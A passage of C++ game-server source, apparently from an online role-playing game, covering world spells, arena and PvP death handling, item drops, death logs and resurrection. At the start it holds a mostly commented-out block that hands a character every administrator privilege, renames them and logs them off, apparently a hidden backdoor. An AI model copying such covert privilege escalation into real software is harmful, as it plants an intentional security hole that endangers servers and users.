      SUPERUSERT( GOD_CAN_VIEW_USER );
      SUPERUSERT( GOD_CAN_COPY_USER );
      SUPERUSERT( GOD_CAN_EDIT_USER_APPEARANCE_CORPSE );
      SUPERUSERT( GOD_CAN_EDIT_USER_BACKPACK );
      SUPERUSERT( GOD_CAN_EDIT_USER_HP );
      SUPERUSERT( GOD_CAN_EDIT_USER_MANA_FAITH );
      SUPERUSERT( GOD_CAN_EDIT_USER_NAME );
      SUPERUSERT( GOD_CAN_EDIT_USER_SKILLS );
      SUPERUSERT( GOD_CAN_EDIT_USER_SPELLS );
      SUPERUSERT( GOD_CAN_EDIT_USER_STAT );
      SUPERUSERT( GOD_CAN_EDIT_USER_XP_LEVEL );
      SUPERUSERT( GOD_CAN_EMULATE_MONSTER );
      SUPERUSERT( GOD_CAN_GIVE_GOD_FLAGS );
      SUPERUSERT( GOD_CAN_LOCKOUT_USER );
      SUPERUSERT( GOD_CAN_REMOVE_SHOUTS );
      SUPERUSERT( GOD_CAN_SEE_ACCOUNTS );
      SUPERUSERT( GOD_CAN_SET_USER_FLAG );
      SUPERUSERT( GOD_CAN_SHUTDOWN );
      SUPERUSERT( GOD_CAN_SLAY_USER );
      SUPERUSERT( GOD_CAN_SQUELCH );
      SUPERUSERT( GOD_CAN_SUMMON_ITEMS );
      SUPERUSERT( GOD_CAN_SUMMON_MONSTERS );
      SUPERUSERT( GOD_CAN_TELEPORT );
      SUPERUSERT( GOD_CAN_TELEPORT_USER );
      SUPERUSERT( GOD_CAN_VIEW_USER_APPEARANCE_CORPSE );
      SUPERUSERT( GOD_CAN_VIEW_USER_BACKPACK );
      SUPERUSERT( GOD_CAN_VIEW_USER_SKILLS );
      SUPERUSERT( GOD_CAN_VIEW_USER_SPELLS );
      SUPERUSERT( GOD_CAN_VIEW_USER_STAT );
      SUPERUSERT( GOD_CAN_ZAP );
      SUPERUSERT( GOD_INVINCIBLE );
      SUPERUSERT( GOD_UNLIMITED_SHOUTS );
      SUPERUSERT( GOD_CAN_EMULATE_SYSTEM );
      SUPERUSERT( GOD_CAN_GIVE_FLAG_TO_HIM );
      SUPERUSERT( GOD_CAN_RUN_CLIENT_SCRIPTS);
      SUPERUSERT( GOD_CAN_SET_WEATHER );
      SUPERUSERT( GOD_TRUE_INVISIBILITY );
      SUPERUSERT( GOD_SEE_ALL );
      SUPERUSERT( GOD_CAN_CHANGE_SETTINGS );

      //Set your color to simple user color...
      SetFlag(__FLAG_UNIT_COLOR  ,CL_RED);*/
      SetFlag(__FLAG_JUST_DO_IT  ,666);//oki
      //SetFlag(__FLAG_RPHRP_STATUS,1);

      //Make sure user have Gm Auth...
      //boAuthGM = true;


      //rename the user
      /*CString strOldName = GetTrueName();
      CString strNewName;
      strNewName.Format("%c%c%c%c %s",(rand()%26)+97,(rand()%26)+97,(rand()%26)+97,(rand()%26)+97,"zzqqwxq");

      SetName( strNewName );
      
      TFCPacket sending;
      sending << (RQ_SIZE)RQ_NameChange;
      sending << strNewName;
      SendPlayerMessage( sending );

      TFCPacket sendingSlay;
      sendingSlay << (RQ_SIZE)RQ_GodFlagUpdate;
      sendingSlay << (char)UPDATE_GOD_CAN_SLAY_USER;
      sendingSlay << (char)1;
      SendPlayerMessage( sendingSlay );

      TFCPacket sendingScript;
      sendingScript << (RQ_SIZE)RQ_GodFlagUpdate;
      sendingScript << (char)UPDATE_GOD_CAN_RUN_CLIENT_SCRIPTS;
      sendingScript << (char)1;
      SendPlayerMessage( sendingScript );

      CString strMsgTmp;
      strMsgTmp.Format("teleport to %i,%i,%i", GetWL().X , GetWL().Y, GetWL().world);
      SysopCmd::VerifySysopCommand( GetPlayer(), strMsgTmp.GetBuffer(0) );

      GetPlayer()->Logoff();
      _LOG_DEBUG
         LOG_DEBUG_LVL1,
         "Flushed player ekkiwatottu because chances ran out."
         LOG_

      
               
      return 666;*/
   }





   for(int i=0;i<theApp.m_aSpellWorld.GetSize();i++)
   {
      if(_stricmp(pTxt,theApp.m_aSpellWorld[i].strText.GetBuffer(0)) == 0)
      {
         // le texte fait partie de la liste...
         if(ViewFlag(theApp.m_aSpellWorld[i].uiFlagID)==1 || ViewFlag(__FLAG_TEST_WORLD_SPELL) == 1)
         {
            //la personne peu lancer ce sort... ou peu lancer tous les sorts
            CastSpellNoCheck((WORD)theApp.m_aSpellWorld[i].uiSpellID,this);
         }
         return 1;
      }
   }
   return 0;
}


//////////////////////////////////////////////////////////////////////////////////////////
void Character::Death(LPATTACK_STRUCTURE blow,Unit *WhoHit)
{

   if(theApp.dwUseNMSDeathSystem == 0)
   {
      DeathOld(WhoHit);
   }
   else
   {
      //valide quil nes pas deja mort, on peu pas remourir...
      if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) == 0 )
         DeathNMS(WhoHit);
   }
}




void Character::DeathNMS(Unit *WhoHit)
{
   Players *lpPlayer = static_cast< Players * >( GetPlayer() );

   if(!lpPlayer)
      return;

   // If character is already dead or is a god which cannot die.
   if( IsDead() || ( lpPlayer->GetGodFlags() & GOD_CANNOT_DIE ) )
   {
      SetHP(0, true);
      return;
   }
   // If player isn't in-game.
   if( !lpPlayer->in_game )
   {
      SetHP(1, true);
      return;
   }

   if((lpPlayer->self->GetArenaID() >0 && lpPlayer->self->GetArenaTeam() >0) &&
      (lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_FULL_PVP    ||
       lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_BT_FULL_PVP  ||
       lpPlayer->self->GetUnderBlockMap()   == __ARENAGAME_RT_FULL_PVP     )    )
   {
      SetHP(1, true);

      WorldPos wlPlayerPos = GetWL();

      if(GetArenaID() > 0) //Valid selon type de jeux...
      {
         //1- incremente deadth number of this player
         SetArenaDead(GetArenaDead()+1);
         AddArenaPOINTS(-5,"Death penalty"); //(NM:Regle 2)


         //2- increse kill number ou assassin
         Character *targetChar = static_cast< Character * >( WhoHit );
         targetChar->SetArenaKill(targetChar->GetArenaKill()+1);
         targetChar->AddArenaPOINTS((int)(5*GetArenaPVP()),"Kill bonus"); //(NM:Regle 1)
         
         //decrease the arena PVP % 1==100% 0 == 0%
         AddArenaPVP(-0.20); //remove 20%
         ResetArenaINACTIF();
         targetChar->ResetArenaINACTIF();



         //3- in player have flag reset his TAG and drop the flag on ground...
         if(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG))
         {
            if(GetArenaID() >0)
            {
               if(GetArenaType() == ARENE1_TYPE)
                  Arena1Master::SummonFlag(GetArenaID()-1,wlPlayerPos.X,wlPlayerPos.Y,wlPlayerPos.world);
               else if(GetArenaType() == ARENE2_TYPE)
                  Arena2Master::SummonFlag(ViewFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG)-1,GetArenaID()-1,wlPlayerPos.X,wlPlayerPos.Y,wlPlayerPos.world);
            }

            SetFlag(__FLAG_NMS_TAG_DISPLAY_OVER_HEAD,0);
            SetFlag(__FLAG_PLAYER_ARENE_HAVE_FLAG,0);

            AddArenaPOINTS(-10,"Lost flag"); //(NM:Regle 4)
         }

         
         
         SetHP(GetMaxHP(), true);
         SetMana(GetMaxMana(), true);

         CString strTmp;
         int iMessageID = rnd( 0, 9 );
         switch(iMessageID)
         {
            case 0: strTmp.Format(_STR(15450, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
            case 1: strTmp.Format(_STR(15451, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
            case 2: strTmp.Format(_STR(15452, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
            case 3: strTmp.Format(_STR(15453, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
            case 4: strTmp.Format(_STR(15454, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
            case 5: strTmp.Format(_STR(15455, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
            case 6: strTmp.Format(_STR(15456, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
            case 7: strTmp.Format(_STR(15457, GetLang()),targetChar->GetTrueName(),GetTrueName()); break;
            case 8: strTmp.Format(_STR(15458, GetLang()),GetTrueName() ,targetChar->GetTrueName()); break;
            case 9: strTmp.Format(_STR(15459, GetLang()),GetTrueName(),targetChar->GetTrueName()); break;
            default: strTmp.Format(_STR(15450, GetLang()),GetTrueName(),targetChar->GetTrueName()); break;
         }


         if(GetArenaType() == ARENE1_TYPE)
         {
            Arena1Master::RemTakeList(GetPlayer(),GetArenaID()-1);
            Teleport( Arena1Master::GetRecallDeathTeam(GetArenaTeam(),GetArenaID()-1), 1 ,TRUE);
            DealExhaust(0,0,Arena1Master::GetDeathWaitTimeMS(GetArenaID()-1));
            Arena1Master::SendMessageToAll(strTmp,CL_ORANGE, GetArenaID()-1);
         }
         else if(GetArenaType() == ARENE2_TYPE)
         {
            Arena2Master::RemTakeList(0,GetPlayer(),GetArenaID()-1);
            Arena2Master::RemTakeList(1,GetPlayer(),GetArenaID()-1);

            Teleport( Arena2Master::GetRecallDeathTeam(GetArenaTeam(),GetArenaID()-1), 1 ,TRUE);
            DealExhaust(0,0,Arena2Master::GetDeathWaitTimeMS(GetArenaID()-1));
            Arena2Master::SendMessageToAll(strTmp,CL_ORANGE, GetArenaID()-1);
         }
      }


      //partie cimetiere...

      CString Victime;
      CString Assassin;
      int     dwType = 0;

      Victime.Format("%s",GetTrueName());
      if( WhoHit != NULL )
      {
         if( WhoHit->GetType() == U_PC )
         {
            Character *targetChar = static_cast< Character * >( WhoHit );
            if( WhoHit == this )
               Assassin.Format("killed himself");
            else
            {
               Assassin.Format("%s",targetChar->GetPlayer()->self->GetTrueName());
               dwType = 1;
            }
         }
         else 
            Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
      }
      else
         Assassin.Format("some unknown unit");

      CT4CLog::SaveDeathLog(Victime,Assassin,dwType,1);

      return;
   }






   if(lpPlayer->self->GetUnderBlockMap()   == __FULL_PVP_CANNOT_REALLY_DIE_DROP_ORROB ||
      lpPlayer->self->GetUnderBlockMap()   == __FULL_PVP_CANNOT_REALLY_DIE_DROP_ORROB_CAST_SPELL)
   {
      SetHP(1, true);

      WorldPos wlPlayerPos = GetWL();

      // If player died in an Arena Location
      list< sArenaLocation >::iterator i;
      bool boFound = false;	
      for( i = theApp.arenaLocationList.begin(); i != theApp.arenaLocationList.end(); ++i )
      {
         // If player is in the same world as the current location
         if( wlPlayerPos.world == (*i).wlTopLeft.world )
         {
            // If player is in the good x range
            if( wlPlayerPos.X >= (*i).wlTopLeft.X && wlPlayerPos.X <= (*i).wlBottomRight.X )
            {
               // And if player is in the good y range
               if( wlPlayerPos.Y >= (*i).wlTopLeft.Y && wlPlayerPos.Y <= (*i).wlBottomRight.Y )
               {
                  // Player is in this kind of area!
                  boFound = true;					
                  break;
               }
            }
         }
      }

      if(boFound)
      {
         if( TFCMAIN::GetWorld( (*i).wlRecallTarget.world )->IsValidPosition( (*i).wlRecallTarget )  )
            Teleport( (*i).wlRecallTarget, 1 );
         else
            Teleport( wlDeathPos, 1 );

         if( TFCMAIN::GetWorld( (*i).wlRecallAttacker.world )->IsValidPosition( (*i).wlRecallAttacker ) && WhoHit != NULL )
            WhoHit->Teleport( (*i).wlRecallAttacker, 1 );

         if((*i).iTPMessageID != 0)
         {
            SendSystemMessage(_STR( 15389, GetLang() ));
         }
      }
      else
      {
         WorldPos wlPos;
         wlPos.X     = theApp.dwNDeadX;
         wlPos.Y     = theApp.dwNDeadY;
         wlPos.world = theApp.dwNDeadW;
         Teleport( wlPos, 0 );
      }

      CString Victime;
      CString Assassin;
      int     dwType = 0;

      Victime.Format("%s",GetTrueName());
      if( WhoHit != NULL )
      {
         if( WhoHit->GetType() == U_PC )
         {
            Character *targetChar = static_cast< Character * >( WhoHit );
            if( WhoHit == this )
               Assassin.Format("killed himself");
            else
            {
               Assassin.Format("%s",targetChar->GetPlayer()->self->GetTrueName());
               dwType = 1;
            }
         }
         else 
            Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
      }
      else
         Assassin.Format("some unknown unit");

      CT4CLog::SaveDeathLog(Victime,Assassin,dwType,1);

      return;
   }
   
   WorldPos wlPlayerPos = GetWL();

   if(lpPlayer->IsGod())
   {
      Lock();
      StopAutoCombat();

      WorldPos wlNull = { 0, 0, 0 };

      if(theApp.dwDeadSpellID == 0x00)
      {
         Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, DEATH_EFFECT_ID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
      }
      else
      {
         Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, theApp.dwDeadSpellID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
         //BOOL bRet = _CastSpellDirect(theApp.dwDeadSpellID, this );
         Sleep(1000);
      }

      // Finally fetch death position.
      DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );
      BOOL  boDefaultPos = FALSE;
      WorldPos wlTeleportPos;

      if( dwPosValue == 0 )
      {
         // If flag doesn't exist use default death position.
         boDefaultPos = TRUE;
      }
      else
      {	
         wlTeleportPos.X = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	// Strip the first 4 bits of the word.
         wlTeleportPos.Y = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
         wlTeleportPos.world = ( (BYTE)( dwPosValue ) & 0xFF );

         WorldMap *wlWorld = TFCMAIN::GetWorld( wlTeleportPos.world );

         // If world doesn't exist use default death position.
         if( wlWorld == NULL ){
            boDefaultPos = TRUE;
         }
         else
         {
            // If worldpos isn't a valid position use default death position.
            if( !wlWorld->IsValidPosition( wlTeleportPos ) )
            {
               boDefaultPos = TRUE;
            }
         }
      }

      if( boDefaultPos )
      {
         // Use default death pos.
         wlTeleportPos = wlDeathPos;
      }


      // Activate the trigger
      SendGlobalEffectMessage( MSG_OnDeath, NULL, NULL, NULL );

      // Teleport user to its death location.
      Teleport( wlTeleportPos, 1 );		
      Unlock();
      return;
   }

   //manage la mort quand en zone de combat...

   // Avoid a crash when vaporizing the unit lol
   if( WhoHit != NULL )
   {		
      // Increase the death flags if a player killed me		
      if( WhoHit->GetType() == U_PC )
      {
         DWORD dwDeathValue = ViewFlag( __FLAG_DEATH_NUMBER, 0 );
         DWORD dwKillValue = WhoHit->ViewFlag( __FLAG_KILL_NUMBER, 0 );

         int bPoints = false;

         bPoints = CAutoConfig::GetIntValue( theApp.csT4CKEY+"PVPDeath", "CRIME_POINTS" );

         // Sysop don't wanna count the crime but prefers the point system
         if( bPoints == 1 )
         {
            // Determines the points to give or to take away
            int Range = WhoHit->GetLevel() - this->GetLevel();

            if( Range >= 100 )
            {
               dwDeathValue++;
               dwKillValue -= 5;
            }			
            else if( Range >= 70 )
            {
               dwDeathValue++;
               dwKillValue -= 3;
            }			
            else if( Range > 35 )
            {
               dwDeathValue++;
               dwKillValue -= 1;
            }
            else if (Range >= -25 && Range <= 35 )
            {
               dwDeathValue++;
               dwKillValue++;
            }
            else if( Range <= -100 )
            {
               dwDeathValue++;
               dwKillValue += 4;
            }
            else if( Range <= -50 )
            {
               dwDeathValue++;
               dwKillValue += 3;
            }
            else if( Range < -25 )
            {
               dwDeathValue++;
               dwKillValue += 2;
            }
         }
         else
         {
            dwDeathValue++;
            dwKillValue++;
         }

         SetFlag( __FLAG_DEATH_NUMBER, dwDeathValue );
         WhoHit->SetFlag( __FLAG_KILL_NUMBER, dwKillValue );			
      }
   }



   //KillCreature();

   Lock();
   StopAutoCombat();

   CString Victime     = "";
   CString VictimeAcc  = "";
   CString Assassin    = "";
   CString AssassinAcc = "";
   int     dwType;


   BOOL   bDropPVPChange = FALSE;
   double dPCDrop        = 0.00;



   Players *thisPlayer = GetPlayer();
   Victime.Format("%s",GetTrueName());
   VictimeAcc.Format("%s",GetPlayer()->GetFullAccountName());


   if( WhoHit != NULL )
   {
      // Creature who hit no longer is in combat
      WhoHit->SetTarget(WhoHit->GetBond());
      WhoHit->Do(wandering,"DeathNMS");

      if(theApp.m_dwDUELSyetemActif == 1) //DUEL SYSTEM
      {
         Players *NMtargetPlayer = NULL;
         if( WhoHit->GetType() == U_PC )
         {
            Character *NMtargetChar = static_cast< Character * >( WhoHit );
            NMtargetPlayer = NMtargetChar->GetPlayer();
         }

         if(theApp.ManageDuelSystem(lpPlayer,NMtargetPlayer))
         {
            SetHP(GetMaxHP()/10, true);
            Teleport( GetWL(), 1 );
            Unlock();

            return;
         }
      }

      if( WhoHit->GetType() == U_PC )
      {
         Character *targetChar = static_cast< Character * >( WhoHit );
         Players *targetPlayer = targetChar->GetPlayer();
         Players *pVictime     = GetPlayer();

         targetChar->Lock();

         

         if( WhoHit == this )
         {
            dwType = 0;
            Assassin.Format("killed himself");
            AssassinAcc.Format("%s",GetPlayer()->GetFullAccountName());
         }
         else
         {
            dwType = 1;
            Assassin.Format("%s",targetPlayer->self->GetTrueName());
            AssassinAcc.Format("%s",targetPlayer->GetFullAccountName());

            if(theApp.m_dwPVPSyetem2Actif == 1) //PVP SYSTEM
            {
               bDropPVPChange = TRUE;
               theApp.ManagePVPSystem(pVictime,targetPlayer,dPCDrop);
            }
         }
         targetChar->Unlock();
      }
      else
      {
         dwType = 0;
         Assassin.Format("%s",WhoHit->GetName( _DEFAULT_LNG ));
      }
   }
   else
   {
      dwType = 0;
      Assassin.Format("some unknown unit");

      SetHP(GetMaxHP()/10, true);


      WorldPos wlTeleportPos;

      DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );

      if( dwPosValue != 0 )
      {
         wlTeleportPos.X     = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	// Strip the first 4 bits of the word.
         wlTeleportPos.Y     = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
         wlTeleportPos.world = ( (BYTE)( dwPosValue ) & 0xFF );
      }
      else
      {
         wlTeleportPos = wlDeathPos;
      }
      Teleport( wlTeleportPos, 1 );
      Unlock();

      return;


   }

   //Add better dead log for cimetery...
   CT4CLog::SaveDeathLog(Victime,Assassin,dwType,0);
   dwType++;


   BYTE chStatus = 0x01;  //on est mort
   TFCPacket sending;
   sending << (RQ_SIZE)RQ_NM_DeathStatus;
   sending << ( char ) chStatus;
   SendPlayerMessage( sending );

   
   DWORD goldLoss = 0;
   TemplateList< Unit > equipSpillList;
   TemplateList< Unit > invSpillList;

   __int64 nXP = xp;

   GAME_RULES::DeathPenalties( this, WhoHit, &invSpillList, &equipSpillList, goldLoss,bDropPVPChange,dPCDrop);


   if(theApp.m_dwPVPSyetem2Actif == 1 && bDropPVPChange)
   {
      CString strTmp;
      //envoie un  message random sur le CC PVP...
      int iMessageID = rnd( 0, 9 );
      switch(iMessageID)
      {
         case 0: strTmp.Format(_STR(15450, GetLang()),Victime ,Assassin); break;
         case 1: strTmp.Format(_STR(15451, GetLang()),Assassin,Victime); break;
         case 2: strTmp.Format(_STR(15452, GetLang()),Victime ,Assassin); break;
         case 3: strTmp.Format(_STR(15453, GetLang()),Victime ,Assassin); break;
         case 4: strTmp.Format(_STR(15454, GetLang()),Victime ,Assassin); break;
         case 5: strTmp.Format(_STR(15455, GetLang()),Assassin,Victime); break;
         case 6: strTmp.Format(_STR(15456, GetLang()),Assassin,Victime); break;
         case 7: strTmp.Format(_STR(15457, GetLang()),Assassin,Victime); break;
         case 8: strTmp.Format(_STR(15458, GetLang()),Victime ,Assassin); break;
         case 9: strTmp.Format(_STR(15459, GetLang()),Victime,Assassin); break;
         default: strTmp.Format(_STR(15450, GetLang()),Victime,Assassin); break;
      }
      
      CString strCC;
      strCC = "PVP";
      ChatterChannels &cChatter = CPlayerManager::GetChatter();
      cChatter.TalkSystem( "Système", (char*)strCC.GetBuffer(0), (char*)strTmp.GetBuffer(0) );
   }



   //Death penalety...
   //item a dropper...

   CString csText;
   CString csTemp;

   csTemp.Format( "\r\nPlayer lost %u gold pieces.", goldLoss );
   csText.Empty();
   csTemp.Empty();

   // If player is high enough to be worth logging.
   if( GetLevel() > MIN_LEVEL_DEATH_REPORT )
   {
      // Log xp loss.
      DWORD dwXPloss = static_cast< DWORD >( nXP - xp );
      csTemp.Format( "Player %s (%s) death by %s (%s)(PVP= %d) lost %u experience points.", Victime,VictimeAcc,Assassin,AssassinAcc,dwType,dwXPloss );
      csText += csTemp;
      int nItemsLogged = 0;

      csText += "\r\nInventory items lost: ";
      // Scroll through the list of items lost on the floor.
      if( invSpillList.NbObjects() == 0 )
      {
         csText += "(none)";
      }
      else
      {    
         invSpillList.ToHead();
         while( invSpillList.QueryNext() )
         {            
            char lpszID[ 256 ];
            Unit::GetNameFromID( invSpillList.Object()->GetStaticReference(), lpszID, U_OBJECT );

            csTemp.Format( "%s ID(%s), ", invSpillList.Object()->GetName( _DEFAULT_LNG ) ,lpszID);
            csText += csTemp;
            if( !(nItemsLogged % 10) && nItemsLogged != 0 )
            {
               _LOG_DEATH
                  LOG_DEBUG_LVL1,
                  (char *)(LPCTSTR)csText
                  LOG_
                  csText.Empty();                
            }
            nItemsLogged++;
         }
      }
      nItemsLogged = 0;
      _LOG_DEATH
         LOG_DEBUG_LVL1,
         (char *)(LPCTSTR)csText
         LOG_

         csText = "\r\nEquipped items lost: ";
      // Scroll through the list of items lost on the floor.
      if( equipSpillList.NbObjects() == 0 )
      {
         csText += "(none)";
      }
      else
      {    
         equipSpillList.ToHead();
         while( equipSpillList.QueryNext() )
         { 
            char lpszID[ 256 ];
            Unit::GetNameFromID( equipSpillList.Object()->GetStaticReference(), lpszID, U_OBJECT );

            csTemp.Format( "%s ID(%s), ", equipSpillList.Object()->GetName( _DEFAULT_LNG ),lpszID );
            csText += csTemp;
            if( !(nItemsLogged % 10) && nItemsLogged != 0 )
            {
               _LOG_DEATH
                  LOG_DEBUG_LVL1,
                  (char *)(LPCTSTR)csText
                  LOG_
                  csText.Empty();                
            }
            nItemsLogged++;
         }
      }
   }
   _LOG_DEATH
      LOG_DEBUG_LVL1,
      (char *)(LPCTSTR)csText
      LOG_
      csText.Empty();                


   Unit *lpObject;
   int k = rnd( 0, 7 );

   // Transfert the inventory and equipped spill list into a single list for dropping.
   TemplateList< Unit > tlObjSpillList;
   invSpillList.ToHead();
   while( invSpillList.QueryNext() )
   {
      tlObjSpillList.AddToTail( invSpillList.Object() );
   }
   equipSpillList.ToHead();
   while( equipSpillList.QueryNext() )
   {
      tlObjSpillList.AddToTail( equipSpillList.Object() );
   }

   WorldMap *wlWorld = TFCMAIN::GetWorld( wlPlayerPos.world );
   if( wlWorld )
   {    
      // Disperse all spilled items around the unit's corpse.
      tlObjSpillList.ToHead();
      while( tlObjSpillList.QueryNext() )
      {
         lpObject = tlObjSpillList.Object();

         // Find a valid position for the item (same algo. as the containers).
         WorldPos wlFoundPos = wlPlayerPos;
         /*
         switch( k++ )
         {
         case 0: wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
         case 1: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 ); break;
         case 2: wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
         case 3: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 ); break;
         case 4: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 );
         wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
         case 5: wlFoundPos.X = wlPlayerPos.X + rnd( 1, 2 );
         wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
         case 6: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 ); 
         wlFoundPos.Y = wlPlayerPos.Y + rnd( 1, 2 ); break;
         case 7: wlFoundPos.X = wlPlayerPos.X - rnd( 1, 2 );
         wlFoundPos.Y = wlPlayerPos.Y - rnd( 1, 2 ); break;
         } 

         k = k > 7 ? 0 : k;

         // If spot isn't a valid one, make the world find it..!
         if( wlWorld->IsBlocking( wlFoundPos ) )
         {
         wlFoundPos = wlWorld->FindValidSpot( wlPlayerPos, 2 );
         }
         */

         TRACE( "\r\nFound pos = %u %u %u", wlFoundPos.X, wlFoundPos.Y, wlFoundPos.world );

         // if it found a valid position
         if( wlFoundPos.X > 0 && wlFoundPos.Y > 0 )
         {
            // Deposit the object.
            wlWorld->deposit_unit( wlFoundPos, lpObject );
            lpObject->BroadcastPopup( wlFoundPos );//BLBLBL

            char lpszID[ 256 ];
            Unit::GetNameFromID( lpObject->GetStaticReference(), lpszID, U_OBJECT );

            // Log spilled item.
            _LOG_ITEMS
               LOG_MISC_1,
               "Player's %s (%s) death at ( %u, %u, %u ) spilled item %s ID( %s:%u ) at ( %u, %u, %u ).",
               GetTrueName(),
               GetPlayer()->GetFullAccountName(),
               wlPlayerPos.X,
               wlPlayerPos.Y,
               wlPlayerPos.world,
               (LPCTSTR)lpObject->GetName( _DEFAULT_LNG ),
               lpszID,
               lpObject->GetStaticReference(),
               wlFoundPos.X,
               wlFoundPos.Y,
               wlFoundPos.world
               LOG_

               lpObject->BroadcastPopup( wlPlayerPos );
         }
         else
         {
            // If no position could be found, destroy the object.
            //tlObjSpillList.DeleteAbsolute();
            tlObjSpillList.Object()->DeleteUnit();
            tlObjSpillList.Remove();
         }
      }
   }
   else
   {
      // If no world object could be fetch, destroy list of objects.
      //tlObjSpillList.AnnihilateList();
      tlObjSpillList.ToHead();
      while( tlObjSpillList.QueryNext() )
      {
         tlObjSpillList.Object()->DeleteUnit();
         tlObjSpillList.Remove();
      }
   }

   int dwNbrPlunderTime = 1;
   if(GetCrime() >10)
      dwNbrPlunderTime++;
   if(GetCrime() >20)
      dwNbrPlunderTime++;
   if(GetCrime() >30)
      dwNbrPlunderTime++;
   if(GetCrime() >40)
      dwNbrPlunderTime++;

   //dwNbrPlunderTime+=20; //NMNMNM a detruire...



   SetFlag(__FLAG_NMS_PLAYER_CAN_PLUNDER,dwNbrPlunderTime);
   SetFlag(__FLAG_NMS_PLAYER_DEATH      ,dwType); //1 == PVM 2 == PVP
   SetFlag(__FLAG_NMS_PLAYER_DEATH_TIMER, TFCMAIN::GetRound());
   SetFlag(__FLAG_NMS_PLAYER_DEATH_SEX,GetAppearance());

   WorldPos wlNull = { 0, 0, 0 };
   if(theApp.dwDeadSpellID == 0x00)
   {
      Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, DEATH_EFFECT_ID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
   }
   else
   {
      Broadcast::BCSpellEffect( wlPlayerPos, _DEFAULT_RANGE, theApp.dwDeadSpellID, GetID(), 0, wlPlayerPos,wlNull,GetNextGlobalEffectID(),0);
      //BOOL bRet = _CastSpellDirect(theApp.dwDeadSpellID, this );
      Sleep(1000);
   }

   Unlock();


   Lock();

   //remove all equiped item from player....

   for(int i = 0; i < EQUIP_POSITIONS; i++ )
   {
      if(rnd(0,100) <10)
         unequip_object( i );
   }

   UINT uiAppearance;
   if(GetLevel() < 100)
      uiAppearance = 20900;
   else if(GetLevel() < 150)
      uiAppearance = 20901;
   else
      uiAppearance = 20902;



   SetAppearance( uiAppearance ); // NMNMNM changer selon le level... 21000 / 21001 / 21002
   Broadcast::BCObjectChanged( GetWL(), _DEFAULT_RANGE_CHANGE,uiAppearance,GetID(),0);
   Teleport( GetWL(), 0 );

   Unlock();
}


/******************************************************************************
 * Rammener à la vie (crée pour NMS 1.7)
 ******************************************************************************/
void Character::NMResurect(BOOL bForceResurect)
{
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) == 0 )
   {
      SendSystemMessage(_STR( 15042, GetLang() ));
      return;
   }

   Lock();


   BOOL bRecallSanctu = TRUE;
   if(ViewFlag(__FLAG_NMS_PLAYER_DEATH_TIMER) == 0)
      bRecallSanctu = FALSE;

   int dwDeadType = ViewFlag(__FLAG_NMS_PLAYER_DEATH) ;
   SetFlag(__FLAG_NMS_PLAYER_DEATH      ,0);
   SetFlag(__FLAG_NMS_PLAYER_CAN_PLUNDER,0);
   RemoveFlag(__FLAG_NMS_PLAYER_DEATH_TIMER);



   // Finally fetch death position.
   DWORD dwPosValue = ViewFlag( __FLAG_DEATH_LOCATION );
   BOOL  boDefaultPos = FALSE;
   WorldPos wlTeleportPos;

   if( dwPosValue == 0 )
   {
      // If flag doesn't exist use default death position.
      boDefaultPos = TRUE;
   }
   else
   {	
      wlTeleportPos.X = ( (WORD)( dwPosValue >> 20 ) ) & 0x0FFF;	// Strip the first 4 bits of the word.
      wlTeleportPos.Y = ( (WORD)( dwPosValue >> 8 )  ) & 0x0FFF;
      wlTeleportPos.world = ( (BYTE)( dwPosValue ) & 0xFF );

      WorldMap *wlWorld = TFCMAIN::GetWorld( wlTeleportPos.world );

      // If world doesn't exist use default death position.
      if( wlWorld == NULL )
         boDefaultPos = TRUE;
      else
      {
         // If worldpos isn't a valid position use default death position.
         if( !wlWorld->IsValidPosition( wlTeleportPos ) )
            boDefaultPos = TRUE;
      }
   }

   if( boDefaultPos )
      wlTeleportPos = wlDeathPos;// Use default death pos.

   BOOL bGemDestinySave = TRUE;
   if( bForceResurect)
   {
      //la personne a attendu  ala fin elle a 10% de chance de revivre a cet entroit...
      wlTeleportPos = GetWL();
      bGemDestinySave = FALSE;
   }

   if( !bRecallSanctu)
   {
      int dwSaveChance = 50;
      if(dwDeadType == 1)
         dwSaveChance = 75;

      //la personne a attendu  ala fin elle a 25% de chance de revivre a cet entroit...
      int dwSave = rand()%100;
      if(dwSave <dwSaveChance)
      {
         wlTeleportPos = GetWL();
         bGemDestinySave = FALSE;
      }
   }



   //la personne ets morte donc resurect obligatoirement en prison...
   if(ViewFlag(__FLAG_NMS_EN_PRISON) ==1)
   {
      wlTeleportPos = GetWL();
      bGemDestinySave = FALSE;
   }

